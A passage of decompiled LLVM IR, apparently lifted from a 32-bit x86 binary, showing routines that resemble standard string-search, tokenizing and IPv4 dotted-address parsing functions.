  store i32 1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80522ec

dec_label_pc_80522ec:                             ; preds = %dec_label_pc_80522e3.dec_label_pc_80522ec_crit_edge, %dec_label_pc_80522e7
  %v0_80522ec = phi i32 [ %phitmp, %dec_label_pc_80522e3.dec_label_pc_80522ec_crit_edge ], [ 0, %dec_label_pc_80522e7 ]
  %v8_80522ec = icmp eq i32 %v0_80522ec, 0
  store i1 %v8_80522ec, i1* %zf.global-to-local, align 1
  store i32 %v0_80522ec, i32* %edi.global-to-local, align 4
  %v2_80522ef.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80522ef

dec_label_pc_80522ef:                             ; preds = %dec_label_pc_80522d0, %dec_label_pc_80522ec
  %v0_80522f0 = phi i32 [ 0, %dec_label_pc_80522d0 ], [ %v0_80522ec, %dec_label_pc_80522ec ]
  %v2_80522ef = phi i32 [ %v0_80522d0, %dec_label_pc_80522d0 ], [ %v2_80522ef.pre, %dec_label_pc_80522ec ]
  store i32 %v2_80522ef, i32* @edi, align 4
  ret i32 %v0_80522f0

; uselistorder directives
  uselistorder i32 %v0_80522ec, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80522ef, { 1, 0 }
  uselistorder label %dec_label_pc_80522ec, { 1, 0 }
}

define i32 @function_80522f4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80522f4:
  %v0_80522f4 = load i32, i32* @esi, align 4
  store i32 %arg1, i32* @esi, align 4
  %v3_8052307 = inttoptr i32 %arg1 to i16*
  %v4_8052307 = call i32 @function_804f670(i16* %v3_8052307, i32 %arg2, i32 %arg3)
  %v0_805230f = load i32, i32* @esi, align 4
  %v2_805230f = add i32 %v0_805230f, %arg3
  store i32 %v0_80522f4, i32* @esi, align 4
  ret i32 %v2_805230f

; uselistorder directives
  uselistorder i32 (i16*, i32, i32)* @function_804f670, { 2, 0, 1, 5, 3, 6, 4 }
}

define i32 @function_8052318(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8052318:
  %tmp = trunc i32 %arg2 to i8
  %v4_805231d = urem i32 %arg2, 256
  %v4_8052329 = sext i8 %arg1 to i32
  %v2_805232d = add i32 %v4_8052329, %arg3
  %v1_805233f16 = icmp eq i32 %arg3, 0
  br i1 %v1_805233f16, label %dec_label_pc_8052347, label %dec_label_pc_8052343

dec_label_pc_8052331:                             ; preds = %dec_label_pc_8052343
  %v1_8052331 = add i32 %v0_8052331, -1
  %v5_8052332 = load i32, i32* @edx, align 4
  %v6_8052332 = and i32 %v5_8052332, -256
  %v7_8052332 = or i32 %v6_8052332, %v4_805231d
  store i32 %v7_8052332, i32* @edx, align 4
  %v1_8052336 = inttoptr i32 %v1_8052331 to i8*
  %v2_8052336 = load i8, i8* %v1_8052336, align 1
  %v15_8052336 = icmp eq i8 %v2_8052336, %tmp
  br i1 %v15_8052336, label %dec_label_pc_80523c4, label %dec_label_pc_805233e

dec_label_pc_805233e:                             ; preds = %dec_label_pc_8052331
  %v1_805233e = add i32 %v0_805233e, -1
  %v8_805233e = icmp eq i32 %v1_805233e, 0
  br i1 %v8_805233e, label %dec_label_pc_8052347, label %dec_label_pc_8052343

dec_label_pc_8052343:                             ; preds = %dec_label_pc_8052318, %dec_label_pc_805233e
  %v0_805233e = phi i32 [ %v1_805233e, %dec_label_pc_805233e ], [ %arg3, %dec_label_pc_8052318 ]
  %v0_8052331 = phi i32 [ %v1_8052331, %dec_label_pc_805233e ], [ %v2_805232d, %dec_label_pc_8052318 ]
  %v2_8052343 = urem i32 %v0_8052331, 4
  %v3_8052343 = icmp eq i32 %v2_8052343, 0
  %v1_8052345 = icmp eq i1 %v3_8052343, false
  br i1 %v1_8052345, label %dec_label_pc_8052331, label %dec_label_pc_8052347

dec_label_pc_8052347:                             ; preds = %dec_label_pc_805233e, %dec_label_pc_8052343, %dec_label_pc_8052318
  %v0_80523aa.pr = phi i32 [ 0, %dec_label_pc_8052318 ], [ 0, %dec_label_pc_805233e ], [ %v0_805233e, %dec_label_pc_8052343 ]
  %v0_805234c = phi i32 [ %v2_805232d, %dec_label_pc_8052318 ], [ %v1_8052331, %dec_label_pc_805233e ], [ %v0_8052331, %dec_label_pc_8052343 ]
  store i32 %v0_805234c, i32* @ecx, align 4
  %v2_8052350 = mul nuw nsw i32 %v4_805231d, 256
  %v2_8052353 = or i32 %v2_8052350, %v4_805231d
  %v2_8052357 = mul i32 %v2_8052353, 65536
  %v2_805235a = or i32 %v2_8052357, %v2_8052353
  %v6_80523ad13 = icmp ugt i32 %v0_80523aa.pr, 3
  br i1 %v6_80523ad13, label %dec_label_pc_805235e, label %dec_label_pc_80523af

dec_label_pc_805235e:                             ; preds = %dec_label_pc_8052347, %dec_label_pc_80523a7
  %v0_80523a7 = phi i32 [ %v1_80523a7, %dec_label_pc_80523a7 ], [ %v0_80523aa.pr, %dec_label_pc_8052347 ]
  %v0_805235e15 = phi i32 [ %v1_805235e, %dec_label_pc_80523a7 ], [ %v0_805234c, %dec_label_pc_8052347 ]
  %v1_805235e = add i32 %v0_805235e15, -4
  store i32 %v1_805235e, i32* @ecx, align 4
  %v2_8052363 = inttoptr i32 %v1_805235e to i32*
  %v3_8052363 = load i32, i32* %v2_8052363, align 4
  %v4_8052363 = xor i32 %v3_8052363, %v2_805235a
  %v1_8052365 = add i32 %v4_8052363, 2130640639
  %v1_805236b = sub i32 -1, %v4_8052363
  %v2_805236d = xor i32 %v1_8052365, %v1_805236b
  %v1_805236f = and i32 %v2_805236d, -2130640640
  %v2_805236f = icmp eq i32 %v1_805236f, 0
  br i1 %v2_805236f, label %dec_label_pc_80523a7, label %dec_label_pc_8052377

dec_label_pc_8052377:                             ; preds = %dec_label_pc_805235e
  %v7_8052377 = or i32 %v1_805236f, %v4_805231d
  %v1_805237b = add i32 %v0_805235e15, -1
  %v2_805237e = inttoptr i32 %v1_805237b to i8*
  %v3_805237e = load i8, i8* %v2_805237e, align 1
  %v16_805237e = icmp eq i8 %v3_805237e, %tmp
  br i1 %v16_805237e, label %dec_label_pc_80523c4, label %dec_label_pc_8052383

dec_label_pc_8052383:                             ; preds = %dec_label_pc_8052377
  %v1_8052387 = add i32 %v0_805235e15, -2
  %v2_805238a = inttoptr i32 %v1_8052387 to i8*
  %v3_805238a = load i8, i8* %v2_805238a, align 1
  %v16_805238a = icmp eq i8 %v3_805238a, %tmp
  br i1 %v16_805238a, label %dec_label_pc_80523c4, label %dec_label_pc_805238f

dec_label_pc_805238f:                             ; preds = %dec_label_pc_8052383
  %v1_8052393 = add i32 %v0_805235e15, -3
  %v2_8052396 = inttoptr i32 %v1_8052393 to i8*
  %v3_8052396 = load i8, i8* %v2_8052396, align 1
  %v16_8052396 = icmp eq i8 %v3_8052396, %tmp
  br i1 %v16_8052396, label %dec_label_pc_80523c4, label %dec_label_pc_805239b

dec_label_pc_805239b:                             ; preds = %dec_label_pc_805238f
  %v1_805239f = inttoptr i32 %v1_805235e to i8*
  %v2_805239f = load i8, i8* %v1_805239f, align 1
  %v15_805239f = icmp eq i8 %v2_805239f, %tmp
  %v1_80523a1 = icmp eq i1 %v15_805239f, false
  br i1 %v1_80523a1, label %dec_label_pc_80523a7, label %dec_label_pc_80523a3

dec_label_pc_80523a3:                             ; preds = %dec_label_pc_805239b
  br label %dec_label_pc_80523c4

dec_label_pc_80523a7:                             ; preds = %dec_label_pc_805239b, %dec_label_pc_805235e
  %v5_80523b431 = phi i32 [ %v7_8052377, %dec_label_pc_805239b ], [ 0, %dec_label_pc_805235e ]
  %v1_80523a7 = add i32 %v0_80523a7, -4
  %v6_80523ad = icmp ugt i32 %v1_80523a7, 3
  br i1 %v6_80523ad, label %dec_label_pc_805235e, label %dec_label_pc_80523af

dec_label_pc_80523af:                             ; preds = %dec_label_pc_80523a7, %dec_label_pc_8052347
  %v5_80523b430 = phi i32 [ %v4_805231d, %dec_label_pc_8052347 ], [ %v5_80523b431, %dec_label_pc_80523a7 ]
  %v0_80523bc26 = phi i32 [ %v0_80523aa.pr, %dec_label_pc_8052347 ], [ %v1_80523a7, %dec_label_pc_80523a7 ]
  %v0_805235e.lcssa = phi i32 [ %v0_805234c, %dec_label_pc_8052347 ], [ %v1_805235e, %dec_label_pc_80523a7 ]
  br label %dec_label_pc_80523bc

dec_label_pc_80523b3:                             ; preds = %dec_label_pc_80523bc
  %v1_80523bc = add i32 %v0_80523bc, -1
  %v1_80523b3 = add i32 %v0_80523b3, -1
  %v6_80523b4 = and i32 %v5_80523b4, -256
  %v7_80523b4 = or i32 %v6_80523b4, %v4_805231d
  %v1_80523b8 = inttoptr i32 %v1_80523b3 to i8*
  %v2_80523b8 = load i8, i8* %v1_80523b8, align 1
  %v15_80523b8 = icmp eq i8 %v2_80523b8, %tmp
  br i1 %v15_80523b8, label %dec_label_pc_80523c4, label %dec_label_pc_80523bc

dec_label_pc_80523bc:                             ; preds = %dec_label_pc_80523b3, %dec_label_pc_80523af
  %v5_80523b4 = phi i32 [ %v7_80523b4, %dec_label_pc_80523b3 ], [ %v5_80523b430, %dec_label_pc_80523af ]
  %v0_80523b3 = phi i32 [ %v1_80523b3, %dec_label_pc_80523b3 ], [ %v0_805235e.lcssa, %dec_label_pc_80523af ]
  %v0_80523bc = phi i32 [ %v1_80523bc, %dec_label_pc_80523b3 ], [ %v0_80523bc26, %dec_label_pc_80523af ]
  %v10_80523bd = icmp eq i32 %v0_80523bc, 0
  %v1_80523c0 = icmp eq i1 %v10_80523bd, false
  br i1 %v1_80523c0, label %dec_label_pc_80523b3, label %dec_label_pc_80523c2

dec_label_pc_80523c2:                             ; preds = %dec_label_pc_80523bc
  br label %dec_label_pc_80523c4

dec_label_pc_80523c4:                             ; preds = %dec_label_pc_8052331, %dec_label_pc_805238f, %dec_label_pc_8052383, %dec_label_pc_8052377, %dec_label_pc_80523b3, %dec_label_pc_80523a3, %dec_label_pc_80523c2
  %v0_80523c7 = phi i32 [ %v1_805235e, %dec_label_pc_80523a3 ], [ 0, %dec_label_pc_80523c2 ], [ %v1_80523b3, %dec_label_pc_80523b3 ], [ %v1_8052393, %dec_label_pc_805238f ], [ %v1_8052387, %dec_label_pc_8052383 ], [ %v1_805237b, %dec_label_pc_8052377 ], [ %v1_8052331, %dec_label_pc_8052331 ]
  ret i32 %v0_80523c7

; uselistorder directives
  uselistorder i32 %v0_80523bc, { 1, 0 }
  uselistorder i32 %v1_80523a7, { 0, 2, 1 }
  uselistorder i32 %v1_805235e, { 1, 0, 3, 4, 5, 2 }
  uselistorder i32 %v2_8052353, { 1, 0 }
  uselistorder i32 %v0_805234c, { 1, 0, 2 }
  uselistorder i32 %v0_80523aa.pr, { 1, 0, 2 }
  uselistorder i32 %v0_8052331, { 1, 0, 2 }
  uselistorder i32 %v2_805232d, { 1, 0 }
  uselistorder i32 %v4_805231d, { 5, 1, 4, 3, 0, 2 }
  uselistorder i8 %tmp, { 5, 1, 2, 3, 4, 0 }
  uselistorder i32 -3, { 0, 3, 1, 2 }
  uselistorder i32 -2, { 1, 0, 8, 9, 10, 2, 4, 3, 5, 6, 7 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80523c4, { 6, 4, 5, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_805235e, { 1, 0 }
  uselistorder label %dec_label_pc_8052347, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052343, { 1, 0 }
}

define i32 @function_80523c8(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80523c8:
  %eax.global-to-local = alloca i32, align 4
  %v4_80523cb = ptrtoint i8* %arg1 to i32
  store i32 %v4_80523cb, i32* @ebx, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_80523d7 = icmp eq i8* %arg1, null
  %v1_80523d9 = icmp eq i1 %v1_80523d7, false
  br i1 %v1_80523d9, label %dec_label_pc_80523dd, label %dec_label_pc_80523db

dec_label_pc_80523db:                             ; preds = %dec_label_pc_80523c8
  %v1_80523db = inttoptr i32 %arg3 to i32*
  %v2_80523db = load i32, i32* %v1_80523db, align 4
  store i32 %v2_80523db, i32* @ebx, align 4
  br label %dec_label_pc_80523dd

dec_label_pc_80523dd:                             ; preds = %dec_label_pc_80523c8, %dec_label_pc_80523db
  %v0_80523e0 = phi i32 [ %v4_80523cb, %dec_label_pc_80523c8 ], [ %v2_80523db, %dec_label_pc_80523db ]
  %v0_80523dd = load i32, i32* @ecx, align 4
  %v5_80523e0 = inttoptr i32 %v0_80523e0 to i8*
  %v8_80523e1 = call i32 @function_8052784(i8* %v5_80523e0, i32 %arg2, i32 %v0_80523dd, i32 %v0_80523dd)
  store i32 %v8_80523e1, i32* %eax.global-to-local, align 4
  %v0_80523e9 = load i32, i32* @ebx, align 4
  %v2_80523e9 = add i32 %v0_80523e9, %v8_80523e1
  store i32 %v2_80523e9, i32* @ebx, align 4
  %v1_80523eb = inttoptr i32 %v2_80523e9 to i8*
  %v2_80523eb = load i8, i8* %v1_80523eb, align 1
  %v3_80523eb = icmp eq i8 %v2_80523eb, 0
  %v1_80523ee = icmp eq i1 %v3_80523eb, false
  br i1 %v1_80523ee, label %dec_label_pc_80523f6, label %dec_label_pc_80523f0

dec_label_pc_80523f0:                             ; preds = %dec_label_pc_80523dd
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_80523f2 = load i32, i32* @esi, align 4
  %v2_80523f2 = inttoptr i32 %v1_80523f2 to i32*
  store i32 %v2_80523e9, i32* %v2_80523f2, align 4
  %v0_8052420.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805241d

dec_label_pc_80523f6:                             ; preds = %dec_label_pc_80523dd
  %v0_80523f6 = load i32, i32* @edx, align 4
  %v0_80523f8 = load i32, i32* @edi, align 4
  %v8_80523fa = call i32 @function_8052424(i8* %v1_80523eb, i32 %v0_80523f8, i32 %v0_80523f6, i32 %v0_80523f6)
  store i32 %v8_80523fa, i32* %eax.global-to-local, align 4
  %v2_8052402 = icmp eq i32 %v8_80523fa, 0
  %v1_8052404 = icmp eq i1 %v2_8052402, false
  br i1 %v1_8052404, label %dec_label_pc_8052415, label %dec_label_pc_8052406

dec_label_pc_8052406:                             ; preds = %dec_label_pc_80523f6
  %v0_805240a = load i32, i32* @ebx, align 4
  %v5_805240a = inttoptr i32 %v0_805240a to i8*
  %v8_805240b = call i32 @function_8052720(i8* %v5_805240a, i32 0, i32 %v8_80523fa, i32 %v8_80523fa)
  br label %dec_label_pc_8052419

dec_label_pc_8052415:                             ; preds = %dec_label_pc_80523f6
  %v9_80523fa = inttoptr i32 %v8_80523fa to i8*
  store i8 0, i8* %v9_80523fa, align 1
  %v2_8052418 = add i32 %v8_80523fa, 1
  br label %dec_label_pc_8052419

dec_label_pc_8052419:                             ; preds = %dec_label_pc_8052406, %dec_label_pc_8052415
  %storemerge = phi i32 [ %v2_8052418, %dec_label_pc_8052415 ], [ %v8_805240b, %dec_label_pc_8052406 ]
  %v0_8052419 = phi i32 [ %v2_8052418, %dec_label_pc_8052415 ], [ %v8_805240b, %dec_label_pc_8052406 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_8052419 = load i32, i32* @esi, align 4
  %v2_8052419 = inttoptr i32 %v1_8052419 to i32*
  store i32 %v0_8052419, i32* %v2_8052419, align 4
  %v0_805241b = load i32, i32* @ebx, align 4
  store i32 %v0_805241b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805241d

dec_label_pc_805241d:                             ; preds = %dec_label_pc_80523f0, %dec_label_pc_8052419
  %v0_8052420 = phi i32 [ %v0_8052420.pre, %dec_label_pc_80523f0 ], [ %v0_805241b, %dec_label_pc_8052419 ]
  ret i32 %v0_8052420

; uselistorder directives
  uselistorder i32 %v8_80523fa, { 2, 5, 0, 1, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* @esi, { 7, 8, 9, 88, 89, 90, 91, 0, 10, 11, 12, 13, 14, 15, 57, 58, 92, 93, 6, 94, 95, 96, 104, 107, 108, 109, 97, 102, 103, 16, 17, 24, 25, 26, 27, 18, 19, 20, 1, 21, 22, 23, 28, 29, 30, 31, 32, 59, 64, 2, 65, 66, 67, 68, 69, 70, 71, 60, 61, 62, 63, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 3, 83, 5, 84, 85, 86, 87, 33, 34, 35, 110, 4, 111, 112, 56, 119, 120, 98, 99, 100, 101, 113, 114, 115, 116, 117, 118, 105, 106, 54, 55, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 121 }
  uselistorder i32* @edi, { 4, 5, 6, 7, 8, 9, 10, 0, 11, 12, 13, 14, 15, 16, 17, 90, 91, 92, 1, 93, 94, 97, 98, 99, 3, 100, 101, 115, 18, 24, 25, 26, 27, 28, 29, 19, 20, 21, 22, 23, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 2, 84, 85, 86, 87, 88, 30, 31, 32, 113, 114, 109, 110, 111, 112, 95, 96, 42, 43, 56, 57, 58, 59, 107, 108, 60, 61, 102, 103, 104, 105, 106, 33, 34, 35, 36, 37, 38, 39, 40, 41, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 62, 89 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805241d, { 1, 0 }
  uselistorder label %dec_label_pc_8052419, { 1, 0 }
  uselistorder label %dec_label_pc_80523dd, { 1, 0 }
}

define i32 @function_8052424(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8052424:
  %v0_8052425 = load i32, i32* @ebx, align 4
  %v2_805243c13 = load i8, i8* %arg1, align 1
  %v4_805243e18 = icmp eq i8 %v2_805243c13, 0
  br i1 %v4_805243e18, label %dec_label_pc_8052446, label %dec_label_pc_8052442.lr.ph

dec_label_pc_8052442.lr.ph:                       ; preds = %dec_label_pc_8052424
  %v3_805243c14 = zext i8 %v2_805243c13 to i32
  %v5_805243c16 = and i32 %v0_8052425, -256
  %v6_805243c17 = or i32 %v3_805243c14, %v5_805243c16
  %v4_805242a = ptrtoint i8* %arg1 to i32
  %v4_80524356.pre = load i32, i32* @ecx, align 4
  %v1_80524353 = inttoptr i32 %arg2 to i8*
  br label %dec_label_pc_8052442

dec_label_pc_8052430:                             ; preds = %dec_label_pc_8052430.preheader, %dec_label_pc_8052434
  %v0_8052434 = phi i32 [ %v1_8052434, %dec_label_pc_8052434 ], [ %arg2, %dec_label_pc_8052430.preheader ]
  %v4_8052435 = phi i32 [ %v6_8052435, %dec_label_pc_8052434 ], [ %v6_80524358, %dec_label_pc_8052430.preheader ]
  %v1_8052430 = trunc i32 %v4_8052435 to i8
  %v15_8052430 = icmp eq i8 %v1_8052430, %v3_8052430
  br i1 %v15_8052430, label %dec_label_pc_8052448, label %dec_label_pc_8052434

dec_label_pc_8052434:                             ; preds = %dec_label_pc_8052430
  %v1_8052434 = add i32 %v0_8052434, 1
  %v1_8052435 = inttoptr i32 %v1_8052434 to i8*
  %v2_8052435 = load i8, i8* %v1_8052435, align 1
  %v3_8052435 = zext i8 %v2_8052435 to i32
  %v5_8052435 = and i32 %v4_8052435, -256
  %v6_8052435 = or i32 %v3_8052435, %v5_8052435
  %v4_8052437 = icmp eq i8 %v2_8052435, 0
  %v1_8052439 = icmp eq i1 %v4_8052437, false
  br i1 %v1_8052439, label %dec_label_pc_8052430, label %dec_label_pc_805243b

dec_label_pc_805243b:                             ; preds = %dec_label_pc_8052434, %dec_label_pc_8052442
  %v4_8052435621 = phi i32 [ %v6_80524358, %dec_label_pc_8052442 ], [ %v6_8052435, %dec_label_pc_8052434 ]
  %v1_805243b = add i32 %v0_805243b, 1
  %v1_805243c = inttoptr i32 %v1_805243b to i8*
  %v2_805243c = load i8, i8* %v1_805243c, align 1
  %v3_805243c = zext i8 %v2_805243c to i32
  %v5_805243c = and i32 %v4_805243c, -256
  %v6_805243c = or i32 %v3_805243c, %v5_805243c
  %v4_805243e = icmp eq i8 %v2_805243c, 0
  br i1 %v4_805243e, label %dec_label_pc_8052446, label %dec_label_pc_8052442

dec_label_pc_8052442:                             ; preds = %dec_label_pc_8052442.lr.ph, %dec_label_pc_805243b
  %v0_805243b = phi i32 [ %v4_805242a, %dec_label_pc_8052442.lr.ph ], [ %v1_805243b, %dec_label_pc_805243b ]
  %v4_805243c = phi i32 [ %v6_805243c17, %dec_label_pc_8052442.lr.ph ], [ %v6_805243c, %dec_label_pc_805243b ]
  %v4_80524356 = phi i32 [ %v4_80524356.pre, %dec_label_pc_8052442.lr.ph ], [ %v4_8052435621, %dec_label_pc_805243b ]
  %v2_80524354 = load i8, i8* %v1_80524353, align 1
  %v3_80524355 = zext i8 %v2_80524354 to i32
  %v5_80524357 = and i32 %v4_80524356, -256
  %v6_80524358 = or i32 %v3_80524355, %v5_80524357
  %v4_80524379 = icmp eq i8 %v2_80524354, 0
  %v1_805243911 = icmp eq i1 %v4_80524379, false
  br i1 %v1_805243911, label %dec_label_pc_8052430.preheader, label %dec_label_pc_805243b

dec_label_pc_8052430.preheader:                   ; preds = %dec_label_pc_8052442
  %v3_8052430 = trunc i32 %v4_805243c to i8
  br label %dec_label_pc_8052430

dec_label_pc_8052446:                             ; preds = %dec_label_pc_805243b, %dec_label_pc_8052424
  br label %dec_label_pc_8052448

dec_label_pc_8052448:                             ; preds = %dec_label_pc_8052430, %dec_label_pc_8052446
  %v0_805244a = phi i32 [ 0, %dec_label_pc_8052446 ], [ %v0_805243b, %dec_label_pc_8052430 ]
  store i32 %v0_8052425, i32* @ebx, align 4
  ret i32 %v0_805244a

; uselistorder directives
  uselistorder i32 %v1_8052434, { 1, 0 }
  uselistorder i8 %v2_805243c13, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8052448, { 1, 0 }
  uselistorder label %dec_label_pc_8052442, { 1, 0 }
  uselistorder label %dec_label_pc_805243b, { 1, 0 }
}

define i32 @function_805244c(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_805244c:
  %v1_8052457 = icmp eq i8* %arg1, null
  br i1 %v1_8052457, label %dec_label_pc_80524d8, label %dec_label_pc_805245b

dec_label_pc_805245b:                             ; preds = %dec_label_pc_805244c
  %v4_8052453 = ptrtoint i8* %arg1 to i32
  %v0_8052466.pre = load i32, i32* @global_var_8055684, align 4
  br label %dec_label_pc_8052466

dec_label_pc_8052466:                             ; preds = %dec_label_pc_805245b, %dec_label_pc_80524af
  %v0_80524b2 = phi i32 [ 0, %dec_label_pc_805245b ], [ %v2_80524b5, %dec_label_pc_80524af ]
  %v2_80524af = phi i32 [ 1, %dec_label_pc_805245b ], [ %v3_80524af, %dec_label_pc_80524af ]
  %v0_805246c = phi i32 [ %v4_8052453, %dec_label_pc_805245b ], [ %v0_805246c4, %dec_label_pc_80524af ]
  %v1_805246c = inttoptr i32 %v0_805246c to i8*
  %v2_805246c = load i8, i8* %v1_805246c, align 1
  %v3_805246c = sext i8 %v2_805246c to i32
  %v2_805246f = mul nsw i32 %v3_805246c, 2
  %v3_805246f = add i32 %v2_805246f, %v0_8052466.pre
  %v4_805246f = inttoptr i32 %v3_805246f to i8*
  %v5_805246f = load i8, i8* %v4_805246f, align 1
  %v6_805246f = and i8 %v5_805246f, 8
  %v7_805246f = icmp eq i8 %v6_805246f, 0
  br i1 %v7_805246f, label %dec_label_pc_80524d8, label %dec_label_pc_8052476

dec_label_pc_8052476:                             ; preds = %dec_label_pc_8052466
  %v4_805248a.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805248a

dec_label_pc_805247a:                             ; preds = %dec_label_pc_805248a
  %v3_805247a = mul i32 %v1_805247a, 10
  %v2_805247d = add i32 %v3_805247a, -48
  %v3_805247d = add i32 %v2_805247d, %v2_805248c
  %v1_8052481 = add i32 %v3_805247d, -255
  %v6_8052481 = sub i32 254, %v3_805247d
  %v7_8052481 = and i32 %v6_8052481, %v3_805247d
  %v8_8052481 = icmp slt i32 %v7_8052481, 0
  %v9_8052481 = icmp eq i32 %v1_8052481, 0
  %v10_8052481 = icmp slt i32 %v1_8052481, 0
  %v3_8052487 = icmp eq i1 %v10_8052481, %v8_8052481
  %v4_8052487 = icmp eq i1 %v9_8052481, false
  %v5_8052487 = and i1 %v4_8052487, %v3_8052487
  br i1 %v5_8052487, label %dec_label_pc_80524d8, label %dec_label_pc_8052489

dec_label_pc_8052489:                             ; preds = %dec_label_pc_805247a
  %v1_8052489 = add i32 %v0_8052489, 1
  br label %dec_label_pc_805248a

dec_label_pc_805248a:                             ; preds = %dec_label_pc_8052476, %dec_label_pc_8052489
  %v1_805247a = phi i32 [ 0, %dec_label_pc_8052476 ], [ %v3_805247d, %dec_label_pc_8052489 ]
  %v4_805248a = phi i32 [ %v4_805248a.pre, %dec_label_pc_8052476 ], [ %v6_805248a, %dec_label_pc_8052489 ]
  %v0_8052489 = phi i32 [ %v0_805246c, %dec_label_pc_8052476 ], [ %v1_8052489, %dec_label_pc_8052489 ]
  %v1_805248a = inttoptr i32 %v0_8052489 to i8*
  %v2_805248a = load i8, i8* %v1_805248a, align 1
  %v3_805248a = zext i8 %v2_805248a to i32
  %v5_805248a = and i32 %v4_805248a, -256
  %v6_805248a = or i32 %v3_805248a, %v5_805248a
  store i32 %v6_805248a, i32* @edx, align 4
  %v2_805248c = sext i8 %v2_805248a to i32
  %v2_805248f = mul nsw i32 %v2_805248c, 2
  %v3_805248f = add i32 %v2_805248f, %v0_8052466.pre
  %v4_805248f = inttoptr i32 %v3_805248f to i16*
  %v5_805248f = load i16, i16* %v4_805248f, align 2
  %v2_8052494 = and i16 %v5_805248f, 8
  %v3_8052494 = icmp eq i16 %v2_8052494, 0
  %v1_8052496 = icmp eq i1 %v3_8052494, false
  br i1 %v1_8052496, label %dec_label_pc_805247a, label %dec_label_pc_8052498

dec_label_pc_8052498:                             ; preds = %dec_label_pc_805248a
  %v8_8052498 = sub nsw i32 2, %v2_80524af
  %v9_8052498 = and i32 %v8_8052498, %v2_80524af
  %v10_8052498 = icmp slt i32 %v9_8052498, 0
  %v11_8052498 = icmp eq i32 %v2_80524af, 3
  %v12_8052498 = icmp slt i32 %v2_80524af, 3
  %v3_805249c = icmp eq i1 %v12_8052498, %v10_8052498
  %v4_805249c = icmp eq i1 %v11_8052498, false
  %v5_805249c = and i1 %v4_805249c, %v3_805249c
  br i1 %v5_805249c, label %dec_label_pc_80524a6, label %dec_label_pc_805249e

dec_label_pc_805249e:                             ; preds = %dec_label_pc_8052498
  %v10_805249e = icmp eq i8 %v2_805248a, 46
  %v1_80524a1 = icmp eq i1 %v10_805249e, false
  br i1 %v1_80524a1, label %dec_label_pc_80524d8, label %dec_label_pc_80524a3

dec_label_pc_80524a3:                             ; preds = %dec_label_pc_805249e
  %v1_80524a3 = add i32 %v0_8052489, 1
  br label %dec_label_pc_80524af

dec_label_pc_80524a6:                             ; preds = %dec_label_pc_8052498
  %v1_80524a6 = add i32 %v0_8052489, 1
  %v4_80524a7 = icmp eq i8 %v2_805248a, 0
  br i1 %v4_80524a7, label %dec_label_pc_80524af, label %dec_label_pc_80524ab

dec_label_pc_80524ab:                             ; preds = %dec_label_pc_80524a6
  %v2_80524ab = and i16 %v5_805248f, 32
  %v3_80524ab = icmp eq i16 %v2_80524ab, 0
  br i1 %v3_80524ab, label %dec_label_pc_80524d8, label %dec_label_pc_80524af

dec_label_pc_80524af:                             ; preds = %dec_label_pc_80524ab, %dec_label_pc_80524a6, %dec_label_pc_80524a3
  %v0_805246c4 = phi i32 [ %v1_80524a6, %dec_label_pc_80524ab ], [ %v1_80524a6, %dec_label_pc_80524a6 ], [ %v1_80524a3, %dec_label_pc_80524a3 ]
  %v3_80524af = add nuw nsw i32 %v2_80524af, 1
  %v2_80524b2 = mul i32 %v0_80524b2, 256
  %v2_80524b5 = or i32 %v1_805247a, %v2_80524b2
  %v7_80524bb = icmp sgt i32 %v2_80524af, 3
  br i1 %v7_80524bb, label %dec_label_pc_80524bd, label %dec_label_pc_8052466

dec_label_pc_80524bd:                             ; preds = %dec_label_pc_80524af
  %v4_80524bd = icmp eq i32 %arg2, 0
  br i1 %v4_80524bd, label %dec_label_pc_80524da, label %dec_label_pc_80524c9

dec_label_pc_80524c9:                             ; preds = %dec_label_pc_80524bd
  %v1_80524cd = call i32 @llvm.bswap.i32(i32 %v2_80524b5)
  %v2_80524cf = inttoptr i32 %arg2 to i32*
  store i32 %v1_80524cd, i32* %v2_80524cf, align 4
  br label %dec_label_pc_80524da

dec_label_pc_80524d8:                             ; preds = %dec_label_pc_80524ab, %dec_label_pc_805249e, %dec_label_pc_8052466, %dec_label_pc_805247a, %dec_label_pc_805244c
  br label %dec_label_pc_80524da

dec_label_pc_80524da:                             ; preds = %dec_label_pc_80524bd, %dec_label_pc_80524c9, %dec_label_pc_80524d8
  %v0_80524df = phi i32 [ 1, %dec_label_pc_80524bd ], [ 1, %dec_label_pc_80524c9 ], [ 0, %dec_label_pc_80524d8 ]
  ret i32 %v0_80524df

; uselistorder directives
  uselistorder i32 %v2_805248c, { 1, 0 }
  uselistorder i32 %v6_805248a, { 1, 0 }
  uselistorder i8 %v2_805248a, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8052489, { 0, 1, 3, 2 }
  uselistorder i32 %v1_8052481, { 1, 0 }
  uselistorder i32 %v3_805247d, { 1, 0, 3, 2 }
